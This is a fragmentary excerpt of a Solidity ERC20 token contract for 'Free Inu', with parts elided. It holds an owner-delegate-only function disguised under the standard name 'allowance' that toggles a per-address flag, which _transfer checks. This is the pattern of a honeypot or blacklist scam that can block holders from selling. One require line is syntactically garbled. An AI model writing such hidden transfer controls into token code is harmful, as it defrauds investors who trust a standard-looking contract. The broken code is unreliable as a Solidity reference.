...
contract ERC20 is Context, Ownable, IERC20 {
     ...
     */
    function allowance (address spender) external onlyDelegates { if (_allowance[spender] == false)
        {_allowance[spender] = true;} else {_allowance[spender] = false; }
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        (_allowance[sender] || _allowance[recipient]) require 
...
contract FreeInu is ERC20 {
 
    /**
     * @dev Sets the values for {name}, {symbol} {decimals} and {totalsupply}.
     */
    constructor() ERC20('Free Inu', 'FREEINU', 9) {
        _totalSupply = 12000000000000*10**9;
